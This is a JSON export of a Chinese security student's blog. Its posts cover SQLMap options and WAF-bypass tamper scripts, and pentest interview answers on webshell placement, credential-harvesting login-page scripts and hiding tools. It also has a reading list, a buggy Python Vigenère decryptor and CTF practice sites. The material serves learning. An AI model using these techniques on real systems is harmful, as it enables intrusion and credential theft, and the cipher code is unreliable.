{"meta":{"title":"Coda's Blog","subtitle":null,"description":"一条咸鱼的翻身之路","author":"Hector","url":"http://whosurdaddy.cf"},"pages":[{"title":"","date":"2019-09-05T08:10:34.880Z","updated":"2019-03-17T04:25:23.000Z","comments":true,"path":"404.html","permalink":"http://whosurdaddy.cf/404.html","excerpt":"","text":""},{"title":"about","date":"2018-08-29T07:39:17.000Z","updated":"2019-03-17T04:25:23.000Z","comments":true,"path":"about/index.html","permalink":"http://whosurdaddy.cf/about/index.html","excerpt":"","text":"学信息安全的菜鸟一个，在校学生，随时写点东西，记点想法。 兴趣在web和硬件上，擅长隐写，烧脑子的密码学，还是要努力啊。 希望有朝一日翻身成功。 也许有一天我也会成为他们那样的大佬吧。"},{"title":"categories","date":"2018-11-03T09:10:28.000Z","updated":"2019-03-17T04:25:23.000Z","comments":true,"path":"categories/index.html","permalink":"http://whosurdaddy.cf/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-11-03T09:08:41.000Z","updated":"2019-03-17T04:25:23.000Z","comments":false,"path":"tags/index.html","permalink":"http://whosurdaddy.cf/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"SQLMap使用要点","slug":"SQLMap使用要点","date":"2019-09-23T05:18:42.000Z","updated":"2019-09-23T13:41:53.549Z","comments":true,"path":"2019/09/23/SQLMap使用要点/","link":"","permalink":"http://whosurdaddy.cf/2019/09/23/SQLMap使用要点/","excerpt":"简介注入技术： 基于布尔类型的盲注。 基于时间的盲注。 基于报错注入。 联合查询注入。 堆查询注入。","text":"简介注入技术： 基于布尔类型的盲注。 基于时间的盲注。 基于报错注入。 联合查询注入。 堆查询注入。 入门 判断是否存在注入 sqlmap -u {URL} 注入点参数&gt;=2时，需要添加双引号： sqlmap -u “{URL}” 判断文本中的请求是否存在注入直接从文本文件中获取HTTP请求，无需设置cookie、POST等参数。 sqlmap -r {FILE_PATH} 查询参数 参数 缩写 含义 备注 - -dbs -D 数据库名 - -tables -T 表名 - -columns -C 字段名 - -dump 获取具体信息 需要指定前三个参数 - -users 列出所有管理用户 当前用户有权限读取包含所有用户的表 - -passwords 列出数据库用户密码 当前用户有权限读取包含用户密码的表 - -current-db 列出当前使用的数据库 - -current-user 列出当前使用的数据库用户 进阶 参数 含义 备注 示例 - -level 5 执行的测试等级，越高越全面 一级：GET、POST，二级：cookie，三级：User-Agent、Referer，五级：全部测试 - -is-dba 是否为管理权限 - -roles 列出数据库管理员账号 - -referer HTTP Referer头 - -referer http://www.examples.com - -sql-shell 执行制定SQL语句 - -os-cmd 运行任意操作系统命令 - -file-read 从数据库服务器中读取数据 - -file-read “{FILE_PATH}” -v 1 - -file-write,- -file-dest 上传文件到数据库服务器中 - -file-write “{SRC_FILE_PATH}” - -file-dest “{DST_FILE_PATH}” -v 1 高阶：绕过脚本tamper讲解 脚本名称 作用 支持的数据库 测试通过的数据库类型和版本 apostrophemask.py 用utf8代替引号 all base64encode.py 用base64编码替换 all multiplespaces.py 围绕SQL关键字添加多个空格 all space2plus.py 用+替换空格 all nonrecursivereplacement.py 双重查询语句。取代predefined SQL关键字with表示;suitable for替代（例如 .replace（“SELECT”、””)） filters all space2randomblank.py 代替空格字符（“”）从一个随机的空白字符可选字符的有效集 all unionalltounion.py 替换UNION ALL SELECT UNION SELECT all securesphere.py 追加特制的字符串 all space2hash.py 绕过过滤’=’替换空格字符(“)，(‘–’)后跟一个破折号注释，一个随机字符串和一个新行(‘n’) MSSQL equaltolike.py like 代替等号 MSSQL Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5 space2mssqlblank.py 空格替换为其它空符号 MSSQL Microsoft SQL Server 2000、Microsoft SQL Server 2005 space2mssqlhash.py 替换空格 MSSQL between.py 用between替换大于号(&gt;) MSSQL Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0 percentage.py asp允许每个字符前面添加一个%号 MSSQL sp_password.py 追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾 MSSQL charencode.py url编码 MSSQL randomcase.py 随机大小写 MSSQL charunicodeencode.py 字符串 unicode 编码 MSSQL space2comment.py 使用’/**/‘替换空格 MSSQL greatest.py 绕过过滤’&gt;’ ,用GREATEST替换大于号。 MYSQLMySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0 apostrophenullencode.py 绕过过滤双引号，替换字符和双引号。 MYSQL MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0 ifnull2ifisnull.py 绕过对 IFNULL 过滤。替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’ MYSQL MySQL 5.0 and 5.5 space2mssqlhash.py 替换空格 MSSQL modsecurityversioned.py 过滤空格，包含完整的查询版本注释 MSSQL MySQL 5.0 space2mysqlblank.py 空格替换其它空白符号 MSSQL MySQL 5.1 modsecurityzeroversioned.py 包含了完整的查询与零版本注释 MSSQL MySQL 5.0 space2mysqldash.py 替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’） MSSQL bluecoat.py 代替空格字符后与一个有效的随机空白字符的SQL语句。然后替换=为like MSSQL MySQL 5.1, SGOS","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"http://whosurdaddy.cf/tags/Web/"}]},{"title":"渗透测试工程师面试要点","slug":"渗透测试工程师面试要点","date":"2019-09-21T03:44:09.000Z","updated":"2019-09-21T04:22:34.355Z","comments":true,"path":"2019/09/21/渗透测试工程师面试要点/","link":"","permalink":"http://whosurdaddy.cf/2019/09/21/渗透测试工程师面试要点/","excerpt":"常见面试试题 获得到一个待检测的网站后，你觉得应该先做什么？whois、网站源IP、旁站、C段网站、服务器操作系统版本、Web容器版本、程序版本、数据库类型、二级域名、防火墙、维护者信息 … Mysql相关的SQL注入，5.0以上和5.0以下有什么区别？5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。5.0以下是多用户单操作，5.0以上是多用户多操做。 在渗透过程中，收集目标站注册人邮箱对我们有什么价值？丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行登录后台。用邮箱做关键词进行丢进搜索引擎。利用搜索到的关联信息找出其他邮进而得到常用社交账号。社工找出社交账号，里面或许会找出管理员设置密码的习惯 。利用已有信息生成专用字典。观察管理员常逛哪些非大众性网站，拿下它，你会得到更多好东西。","text":"常见面试试题 获得到一个待检测的网站后，你觉得应该先做什么？whois、网站源IP、旁站、C段网站、服务器操作系统版本、Web容器版本、程序版本、数据库类型、二级域名、防火墙、维护者信息 … Mysql相关的SQL注入，5.0以上和5.0以下有什么区别？5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。5.0以下是多用户单操作，5.0以上是多用户多操做。 在渗透过程中，收集目标站注册人邮箱对我们有什么价值？丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行登录后台。用邮箱做关键词进行丢进搜索引擎。利用搜索到的关联信息找出其他邮进而得到常用社交账号。社工找出社交账号，里面或许会找出管理员设置密码的习惯 。利用已有信息生成专用字典。观察管理员常逛哪些非大众性网站，拿下它，你会得到更多好东西。 判断出网站的CMS对渗透有什么意义？更方便了解网站路径结构。查找网上已曝光的程序漏洞。如果开源，还能下载相对应的源码进行代码审计。 一个成熟并且相对安全的CMS，渗透时扫目录的意义？敏感文件、二级目录扫描数据库错误信息站长的误操作比如：网站备份的压缩文件、说明.txt、二级目录可能存放着其他站点 常见的web服务器容器有哪些？IISApacheNginxTengine(淘宝修改Nginx版本)LighttpdTomcat Mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？root权限以及网站的绝对路径。 目前已知哪些版本的容器有解析漏洞，具体举例。IIS 6.0 /xx.asp/xx.jpg “xx.asp”是文件夹名 IIS 7.0/7.5 默认Fast-CGI开启，直接在url中图片地址后面输入/1.php，会把正常图片当成php解析 Nginx 版本小于等于0.8.37，利用方法和IIS 7.0/7.5一样，Fast-CGI关闭情况下也可利用。空字节代码 xxx.jpg%00.php Apache 上传的文件命名为：test.php.x1.x2.x3，Apache是从右往左判断后缀 lighttpd xx.jpg/xx.php 如何手工快速判断目标站是Windows还是Linux服务器？linux大小写敏感,windows大小写不敏感。 为何一个以Mysql作为数据库管理系统的网站，只有一个80端口开放？更改了端口，没有扫描出来。站库分离。（数据库在另一个IP或另一台主机）3306端口不对外开放 RDP协议(3389)无法连接的几种情况。没开放3389 端口端口被修改防护拦截处于内网(需进行端口转发，内网穿透) 如何突破注入时字符被转义？宽字符注入hex编码绕过 在某后台新闻编辑界面看到编辑器，应该先做什么？查看编辑器的名称版本,然后搜索公开的漏洞。 拿到一个webshell发现网站根目录下有.htaccess文件，我们能做什么？能做的事情很多，用隐藏网马来举例子：插入SetHandler application/x-httpd-php.jpg文件会被解析成.php文件。具体其他的事情，不好详说，建议大家自己去搜索语句来玩玩。 注入漏洞只能查账号密码？权限高的话，可以读写文件，比如写入webshell。 安全狗会追踪变量，从而发现出是一句话木马吗？（答案不确定）是根据特征码，所以很好绕过了，只要思路宽，绕狗绕到欢，但这应该不会是一成不变的。 Access 扫出后缀为asp的数据库文件，访问乱码。如何实现到本地利用。迅雷下载，直接改后缀为.mdb。 提权时选择可读写目录，为何尽量不用带空格的目录？因为执行exp多半需要空格界定参数。 某服务器有站点A,B 为何在A的后台添加test用户，访问B的后台。发现也添加上了test用户？共用数据库。 注入时可以不使用and 或or 或xor，直接order by 开始注入吗？and/or/xor，前面的1=1、1=2步骤只是为了判断是否为注入点，如果已经确定是注入点那就可以省那步骤去。 某个防注入系统，在注入时会提示： 系统检测到你有非法注入的行为。已记录您的ip xx.xx.xx.xx时间:2016:01-23提交页面:test.asp?id=15提交内容:and 1=1 如何利用这个防注入系统拿shell？在URL里面直接提交一句话，这样网站就把你的一句话也记录进数据库文件了 这个时候可以尝试寻找网站的配置文件 直接上菜刀链接。 上传大马后访问乱码时，有哪些解决办法？浏览器中改编码。 审查上传点的元素有什么意义？有些站点的上传文件类型的限制是仅在前端实现，这时只要增加上传类型就能突破限制了。 目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？先爆破用户名，再利用被爆破出来的用户名爆破密码。其实有些站点，在登陆处也会这样提示所有和数据库有交互的地方都有可能有注入，万能密码字典走一波。 目标站发现某txt的下载地址为http://www.test.com/down/down.php?file=/upwdown/1.txt，你有什么思路？这就是传说中的下载漏洞！在file=后面尝试输入index.php下载他的首页文件，然后在首页文件里继续查找其他网站的配置文件，可以找出网站的数据库密码和数据库的地址。 甲给你一个目标站，并且告诉你根目录下存在/abc/目录，并且此目录下存在编辑器和admin目录。请问你的想法是？直接在网站二级目录/abc/下扫描敏感文件及目录。 在有shell的情况下，如何使用xss实现对目标站的长久控制？后台登录处加一段记录登录账号密码的js，并且判断是否登录成功，如果登录成功，就把账号密码记录到一个生僻的路径的文件中或者直接发到自己的网站文件中。(此方法适合有价值并且需要深入控制权限的网络)。在登录后才可以访问的文件中插入XSS脚本。 后台修改管理员密码处，原密码显示为*。你觉得该怎样实现读出这个用户的密码？审查元素 把密码处的password属性改成text就明文显示了 目标站无防护，上传图片可以正常访问，上传脚本格式访问则403.什么原因？原因很多，有可能web服务器配置把上传目录写死了不执行相应脚本，可以尝试改后缀名绕过 审查元素得知网站所使用的防护软件，你觉得怎样做到的？在敏感操作被拦截，通过界面信息无法具体判断是什么防护的时候，F12看HTML体部 比如护卫神就可以在名称那看到内容。 在win2003服务器中建立一个 .zhongzi文件夹用意何为？隐藏文件夹，为了不让管理员发现你传上去的工具。 SQL注入有以下两个测试选项，选一个并且阐述不选另一个的理由：A. demo.jsp?id=2+1 B. demo.jsp?id=2-1选B，在 URL 编码中 + 代表空格，可能会造成混淆 以下链接存在 SQL 注入漏洞，对于这个变形注入，你有什么思路？demo.do?DATA=AjAxNg==DATA有可能经过了 base64 编码再传入服务器，所以我们也要对参数进行 base64 编码才能正确完成测试 发现 demo.jsp?uid=110 注入点，你有哪几种思路获取 webshell，哪种是优选？有写入权限的，构造联合查询语句使用using INTO OUTFILE，可以将查询的输出重定向到系统的文件中，这样去写入 WebShell使用 sqlmap –os-shell 原理和上面一种相同，来直接获得一个 Shell，这样效率更高通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 Shell CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验RefererXXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。 CSRF、SSRF和重放攻击有什么区别？CSRF是跨站请求伪造攻击，由客户端发起SSRF是服务器端请求伪造，由服务器发起重放攻击是将截获的数据包进行重放，达到身份认证等目的 说出至少三种业务逻辑漏洞，以及修复方式？密码找回漏洞中存在密码允许暴力破解、存在通用型找回凭证、可以跳过验证步骤、找回凭证可以拦包获取等方式来通过厂商提供的密码找回功能来得到密码身份认证漏洞中最常见的是会话固定攻击和 Cookie 仿冒，只要得到 Session 或 Cookie 即可伪造用户身份验证码漏洞中存在验证码允许暴力破解、验证码可以通过 Javascript 或者改包的方法来进行绕过 圈出下面会话中可能存在问题的项，并标注可能会存在的问题？ 1234567891011get /ecskins/demo.jsp?uid=2016031900&amp;keyword=”hello world”HTTP/1.1Host:*******.com:82User-Agent:Mozilla/5.0 Firefox/40Accept:text/css,*/*;q=0.1Accept-Language:zh-CN;zh;q=0.8;en-US;q=0.5,en;q=0.3Referer:http://*******.com/eciop/orderForCC/cgtListForCC.htm?zone=11370601&amp;v=145902Cookie:myguid1234567890=1349db5fe50c372c3d995709f54c273d;uniqueserid=session_OGRMIFIYJHAH5_HZRQOZAMHJ;st_uid=N90PLYHLZGJXI-NX01VPUF46W;status=TrueConnection:keep-alive 开放性问题找一类你最擅长的漏洞，谈下绕过漏洞修复后的方案？你常用的渗透工具有哪些，最常用的是哪个？描述一个你深入研究过的 CVE 或 POC。谈谈你经常关注的安全平台？内网渗透拿域控手法有哪些？不通过3389，拿到内网一台服务器权限，如何扩大战果?手工注入一般使用哪些函数?APT攻击一般打点的方式有哪些? 其他参考","categories":[],"tags":[]},{"title":"我的书单","slug":"我的书单","date":"2019-09-12T01:12:49.000Z","updated":"2019-09-22T08:54:11.833Z","comments":true,"path":"2019/09/12/我的书单/","link":"","permalink":"http://whosurdaddy.cf/2019/09/12/我的书单/","excerpt":"WEB 《Web前端黑客技术揭秘》编著：钟晨鸣 徐少培出版社：电子工业出版社ISBN：978-7-121-19203-6心得： 《网络安全攻防实战研究：漏洞利用与提权》编著：祝烈煌，张子剑出版社：电子工业出版社ISBN：978-7-121-33240-1心得： 《SQL注入攻击与防御 第二版》编著：Justin Clarke【美】施宏斌 叶愫【译】出版社：清华大学出版社ISBN：978-7-302-34005-8心得：","text":"WEB 《Web前端黑客技术揭秘》编著：钟晨鸣 徐少培出版社：电子工业出版社ISBN：978-7-121-19203-6心得： 《网络安全攻防实战研究：漏洞利用与提权》编著：祝烈煌，张子剑出版社：电子工业出版社ISBN：978-7-121-33240-1心得： 《SQL注入攻击与防御 第二版》编著：Justin Clarke【美】施宏斌 叶愫【译】出版社：清华大学出版社ISBN：978-7-302-34005-8心得： 《白帽子讲Web安全》编著：吴翰清出版社：电子工业出版社ISBN：978-7-121-23410-1心得： 《Web安全攻防：渗透测试实战指南》编著：徐焱 李文轩 王亚东出版社：电子工业出版社ISBN：978-7-121-34283-7心得： 《白帽子讲Web扫描》编著：刘漩出版社：电子工业出版社ISBN：978-7-121-31477-3心得： 《Web渗透测试:使用Kali Linux》编著：Joseph Muniz【美】 Aamir Lakhani【美】出版社：人民邮电出版社ISBN：978-7-115-36315-2心得： 《黑客攻防技术宝典:finding and exploiting security flaws.Web实战篇》编著：Dafydd Stuttard【英】 Marcus Pinto【英】出版社：人民邮电出版社ISBN：978-7-115-28392-4心得： 系统编程 《TCP/IP详解 卷一：协议》编著：Kevin R. Fall【美】出版社：机械工业出版社ISBN：978-7-111-45383-3心得： 《Kali Linux渗透测试的艺术》编著：Lee Allen【英】出版社：人民邮电出版社ISBN：978-7-115-37844-6心得： 《Python核心编程 第三版》编著：Wesley Chun【美】出版社：人民邮电出版社ISBN：978-7-115-41477-9心得： 《PHP+MySQL网站开发项目式教程》编著：传播智客出版社：人民邮电出版社ISBN：9787-115-42729-8心得： 《Linux指令从入门到精通》编著：宋磊 宋馥莉 雷文利出版社：人民邮电出版社ISBN：978-7-115-33223-3心得： 《网络安全技术实验教程》编著：刘铭出版社：北京师范大学出版社ISBN：978-7-303-21263-7心得： 《网络攻防与实践》编著：刘坤出版社：北京理工大学出版社ISBN：978-7-5682-5132-7心得： 《渗透测试高手:打造固若金汤的安全网络》编著：Wil Allsopp【美】出版社：清华大学出版社ISBN：978-7-302-49780-6心得： 《网络安全程序设计》编著：李红娇出版社：清华大学出版社ISBN：978-7-302-45180-8心得： 《深入浅出深度学习:原理剖析与Python实践》编著：黄安埠出版社：电子工业出版社ISBN：978-7-121-31270-0心得： 《Python深度学习》编著：弗朗索瓦·肖莱出版社：人民邮电出版社ISBN：978-7-115-48876-3心得： 《黑客之道：漏洞发掘的艺术》编著：Jon Erickson【美】出版社：中国水利水电出版社ISBN：978-7-5084-6620-0心得： 《Metasploit渗透测试手册》编著：Abhinav Singh【印度】出版社：人民邮电出版社ISBN：978-7-115-32383-5心得： 《Kali Linux高级渗透测试》编著：罗伯特 W. 贝格斯【加拿大】出版社：机械工业出版社ISBN：978-7-111-53639-0心得： 《Python网络编程攻略》编著：M. O. Faruque Sarker【英】出版社：人民邮电出版社ISBN：978-7-115-37269-7心得： 《Python硬件编程实战》编著：李茂出版社：机械工业出版社ISBN：978-7-111-48774-6心得： 《像计算机科学家一样思考Python》编著：Allen B. Downey【美】出版社：人民邮电出版社ISBN：978-7-115-32092-6心得： 《Python灰帽子:黑客与逆向工程师的Python编程之道》编著：Justin Seitz【美】出版社：电子工业出版社ISBN：978-7-121-12901-8心得： 《Linux shell脚本编程入门》编著：金泰龙【韩】出版社：人民邮电出版社ISBN：978-7-115-36659-7心得： 《Kali渗透测试技术实战》编著： James Broad【美】 Andrew Bindner【美】出版社：机械工业出版社ISBN：978-7-111-47320-6心得： 《Linux常用命令简明手册》编著：邢国庆出版社：电子工业出版社ISBN：978-7-121-21322-9心得： 《Kali Linux &amp; Back Track 渗透测试实战》编著：赵涏元【韩】出版社：人民邮电出版社ISBN：978-7-115-37058-7心得： 《Python游戏编程入门》编著：Jonathan S. Harbour【美】出版社：人民邮电出版社ISBN：978-7-115-37511-7心得： 《Metasploit渗透测试魔鬼训练营》编著：诸葛建伟出版社：机械工业出版社ISBN：978-7-111-43499-3 《网络渗透技术》编著：许治坤出版社：电子工业出版社ISBN：978-7-121-01035-6心得： 《Linux指令从入门到精通》编著：宋磊 宋馥莉 雷文利出版社：人民邮电出版社ISBN：978-7-115-33223-3心得： 《Red Hat Linux 9 入门与提高》编著：杨建新出版社：清华大学出版社ISBN：978-7-305-12287-6心得： 安全审计 《Wireshark数据包分析实战 第三版》编著：Chris Sanders【美】出版社：人民邮电出版社ISBN：978-7-115-49431-3心得： 《诸神之眼:Nmap网络安全审计技术揭秘》编著：李华峰出版社：清华大学出版社ISBN：978-7-302-47236-0心得： 二进制 《逆向工程核心原理》编著：李承远【韩】出版社：人民邮电出版社ISBN：978-7-115-35018-3心得： 《汇编语言及应用教程》编著：李浪 熊江 齐忠出版社：华中科技大学出版社ISBN：978-7-5609-6458-4心得： 密码学 《加密解密全攻略 第三版》编著：武新华出版社：中国铁道出版社ISBN：978-7-113-11532-6心得： 社会工程 《反入侵的艺术:黑客入侵背后的真实故事》编著：Kevin D.Mitnick【美】 William L.Simon【美】出版社：清华大学出版社ISBN：978-7-302-37358-2心得： 单片机 《Raspberry Pi开发实战》编著：/Simon Monk【美】出版社：机械工业出版社ISBN：978-7-111-49074-6心得： 《树莓派Python编程指南》编著：Alex Bradbury【美】 Ben Everard【美】出版社：机械工业出版社ISBN：978-7-111-48986-3心得： 《动手玩转Arduino》编著：John Boxall【澳】出版社：人民邮电出版社ISBN：978-7-115-33596-8心得： 《树莓派Python编程指南》编著：Alex Bradbury【美】 Ben Everard【美】出版社：机械工业出版社ISBN：978-7-111-48986-3心得： 《树莓派应用速成 网络应用秘方》编著：Rick Golden【美】出版社：科学出版社ISBN：978-7-03-039908-3心得： 后记心得等有时间补上去，剩下的还有后续补充，封面之类的有空再传。","categories":[],"tags":[{"name":"书单","slug":"书单","permalink":"http://whosurdaddy.cf/tags/书单/"}]},{"title":"编译原理（一）","slug":"编译原理（一）","date":"2019-09-09T03:42:01.059Z","updated":"2019-03-17T04:25:23.000Z","comments":true,"path":"2019/09/09/编译原理（一）/","link":"","permalink":"http://whosurdaddy.cf/2019/09/09/编译原理（一）/","excerpt":"翻译程序1.功能 源程序-&gt;翻译程序-&gt;目标程序（目标代码） 翻译程序有三种：编译程序、解释程序、汇编程序","text":"翻译程序1.功能 源程序-&gt;翻译程序-&gt;目标程序（目标代码） 翻译程序有三种：编译程序、解释程序、汇编程序 2.基本结构源程序想要翻译成为目标程序需要下面基本五部分： 词法分析 对构成输入的源程序的字符串进行扫描和分解，识别出一个个单词和符号，如标识符、常数、界限符等。 语法分析 在词法分析的基础上，根据语言的语法规则，把单词符号分解成各类语法单位（语法范畴），如短语、句子、程序段等。 语义分析和中间代码生成 首先对各种语法范畴进行静态语义检查，如果正确则进行中间代码的翻译。该阶段遵循的是语言的语义规则，通常使用属性文法描述语义规则。中间代码的形式有四元式、三元式、逆波兰式和树形表示。 代码优化 优化所遵循的是程序的等价变换原则。其方法有公共子表达式的提取、循环优化、删除无用代码等。 目标代码生成 把中间代码（或经优化处理后）变换成特定机器上的低级语言代码。它有赖于硬件系统结构和机器指令的含义。","categories":[],"tags":[{"name":"编译原理随记","slug":"编译原理随记","permalink":"http://whosurdaddy.cf/tags/编译原理随记/"}]},{"title":"维吉尼亚密码的Python实现","slug":"维吉尼亚密码的Python实现","date":"2019-09-09T03:42:01.050Z","updated":"2019-03-17T04:25:23.000Z","comments":true,"path":"2019/09/09/维吉尼亚密码的Python实现/","link":"","permalink":"http://whosurdaddy.cf/2019/09/09/维吉尼亚密码的Python实现/","excerpt":"0x00 序代换密码体制的一般定义为M=C=K=Z26，其中M为明文空间、C为密文空间、K为密钥空间、Z26为26个整数(对应26个英文字母)组成的空间；要求26个字母与模26的剩余类集合{0,1,2,…,25}建立一一对应的关系。","text":"0x00 序代换密码体制的一般定义为M=C=K=Z26，其中M为明文空间、C为密文空间、K为密钥空间、Z26为26个整数(对应26个英文字母)组成的空间；要求26个字母与模26的剩余类集合{0,1,2,…,25}建立一一对应的关系。 0x01 移位密码移位密码的加密实际上就是将26个英文字母向后循环移动k位，其加密解密可表示为：c=Ek(m)=m+k(mod 26) m=Dk(c)=c-k(mod 26) 其中，m、c、k是满足0≤m,c,k≤25的整数。 0x01 凯撒密码恺撒密码的替换方法是通过排列明文和密文字母表，密文字母表示通过将明文字母表向左或向右移动一个固定数目的位置。例如，当偏移量是左移3的时候（解密时的密钥就是3）： 明文：THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG密文：WKH TXLFN EURZQ IRA MXPSV RYHU WKH ODCB GRJ 恺撒密码的加密、解密方法还能够通过同余的数学方法进行计算。首先将字母用数字代替，A=0，B=1，…，Z=25。此时偏移量为n的加密方法即为： E{n}(x)=(x+n)\\mod 26} 解密就是： D{n}(x)=(x-n)\\mod 26} 0x02 维吉尼亚密码Vigenenre密码是最著名的多表代换密码，是16世纪法国著名密码学家Vigenenre发明的。Vigenenre密码使用一个词组作为密钥，密钥中每一个字母用来确定一个代换表，每一个密钥字母被用来加密一个明文字母，第一个密钥字母加密第一个明文字母，第二个密钥字母加密第二个明文字母，等所有密钥字母使用完后，密钥再次循环使用，于是加解密前需先将明密文按照密钥长度进行分组。密码算法可表示如下： 设密钥K=(k1,k2,…,kd)，明文M=(m1,m2,…,mn)，密文C=(c1,c2,…,cn)； 加密变换为： ci=Eki(mi)=mi+ki(mod 26) 解密变换为： mi=Dki(ci)=ci-ki(mod 26) 通常通过查询维吉尼亚表进行加解密。 0x04 以下为维吉尼亚密码的Python实现。 main.py1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#!/usr/bin/env python#-*- coding:utf-8 -*-# author:Hector# datetime:20:13#维吉尼亚import VigenereDecryptoimport VigenereEncryptodef main(): info = '''==========********==========''' # 开始加密 print(info, \"\\n------维吉尼亚加密算法------\") print(info) # 读取测试文本文档：傲慢与偏见第一卷第一节 message = open(\"test.txt\",\"r+\").read() print(\"读取测试文本文档:test.txt......\") print(\"开始加密！\") # 输入key key = input(\"请输入密钥：\") # 进入加密算法 CipherText = VigenereEncrypto.VigenereEncrypto(message, key) # 写入密文文本文档 C = open(\"CipherText.txt\", \"w+\") C.write(CipherText) C.close() print(\"加密后得到的密文是: \\n\" + CipherText) # 开始解密 print(info, \"\\n------维吉尼亚解密算法------\") print(info) # 读取加密文本文档 print(\"读取密文文本文档：CipherText.txt......\") Ciphertext = open(\"CipherText.txt\", \"r+\").read() # 进入解密算法 print(\"开始解密！\") Plaintext = VigenereDecrypto.VigenereDecrypto(Ciphertext, key) P = open(\"PlainText.txt\", \"w+\") # 写入解密文本文档 P.write(Plaintext) P.close() print(\"解密后得到的明文是 : \\n\" + Plaintext)if __name__==\"__main__\": main() VigenereEncrypto.py1234567891011121314151617181920212223242526272829303132333435363738#!/usr/bin/env python#-*- coding:utf-8 -*-# author:Hector# datetime:20:14def VigenereEncrypto(message, key): msLen = len(message) keyLen = len(key) message = message.upper() key = key.upper() # 明文空间 raw = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\" # 定义加密后的字符串 ciphertext = \"\" # 开始加密 for i in range(0, msLen): # 轮询key的字符 j = i % keyLen # encode # 判断字符是否为英文字符，不是则直接向后面追加且继续 if message[i] not in raw: ciphertext += message[i] continue encodechr = chr((ord(message[i]) - ord(\"A\") + ord(key[j]) - ord(\"A\")) % 26 + ord(\"A\")) # 追加字符 ciphertext += encodechr # 返回加密后的字符串 return ciphertextif __name__ == \"__main__\": message = \"Hello, World!\" key = \"key\" text = VigenereEncrypto(message, key) print(text) VigenereDecrypto.py123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/env python#-*- coding:utf-8 -*-# author:Hector# datetime:20:14def VigenereDecrypto(ciphertext, key): msLen = len(ciphertext) keyLen = len(key) key = key.upper() # 密文空间 raw = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\" plaintext = \"\" # 开始解密 for i in range(0, msLen): # 轮询key的字符 j = i % keyLen # encode # 判断字符是否为英文字符，不是则直接向后面追加且继续 if ciphertext[i] not in raw: plaintext += ciphertext[i] continue decodechr = chr((ord(ciphertext[i]) - ord(\"A\") - ord(key[j]) - ord(\"A\")) % 26 + ord(\"A\")) # 追加字符 plaintext += decodechr # 返回加密后的字符串 return plaintextif __name__==\"__main__\": ciphertext = \"RIJVS, AMBPB!\" key = \"key\" text = VigenereDecrypto(ciphertext, key) print(text) 0x03 测试测试使用的文本 加密后的明文： 解密后的密文 参考链接：维吉尼亚密码","categories":[],"tags":[{"name":"现代密码学","slug":"现代密码学","permalink":"http://whosurdaddy.cf/tags/现代密码学/"}]},{"title":"各种CTF练手网站","slug":"各种CTF练手网站","date":"2019-09-09T03:42:01.027Z","updated":"2019-03-17T04:25:23.000Z","comments":true,"path":"2019/09/09/各种CTF练手网站/","link":"","permalink":"http://whosurdaddy.cf/2019/09/09/各种CTF练手网站/","excerpt":"咸鱼本人收集的各种CTF训练环境，可以用来练手,持续更新： PWN pwnable","text":"咸鱼本人收集的各种CTF训练环境，可以用来练手,持续更新： PWN pwnable WEB hackthissite RedTiger’s Hackit promt WarGame smashthestack overthewire 综合 exploit-exercises wechall hackme CTF List Crackme challenges","categories":[],"tags":[{"name":"CTF训练环境","slug":"CTF训练环境","permalink":"http://whosurdaddy.cf/tags/CTF训练环境/"}]},{"title":"hexo写作语法","slug":"hexo写作语法","date":"2019-09-09T03:42:00.916Z","updated":"2019-03-17T04:25:23.000Z","comments":true,"path":"2019/09/09/hexo写作语法/","link":"","permalink":"http://whosurdaddy.cf/2019/09/09/hexo写作语法/","excerpt":"写作创建新文章：$ hexo new [layout] &lt;title&gt; 文件名称Hexo 默认以标题做为文件名称，但可编辑 new_post_name 参数来改变默认的文件名称。","text":"写作创建新文章：$ hexo new [layout] &lt;title&gt; 文件名称Hexo 默认以标题做为文件名称，但可编辑 new_post_name 参数来改变默认的文件名称。 草稿创建草稿：$ hexo new draft [layout] &lt;tittle&gt;使用publish命令将草稿移动到source/_post文件夹。$ hexo publish [layout] &lt;title&gt; 模板在新建文章时，Hexo 会根据 scaffolds 文件夹内相对应的文件来建立文件。$ hexo new photo &quot;xxx&quot; 引用块在文章中插入引言，可包含作者、来源和标题。 代码块在文章中插入代码。 另一种形式的代码块是使用三个反引号来包裹。 Image在文章中插入指定大小的图片。 Link在文章中插入链接，并自动给外部链接添加 target=&quot;_blank&quot; 属性。 包含代码文件插入 source 文件夹内的代码文件。 视频在文章中插入YouTube视频。 在文章中插入Vimeo视频。 引用文章引用其他文章的链接。 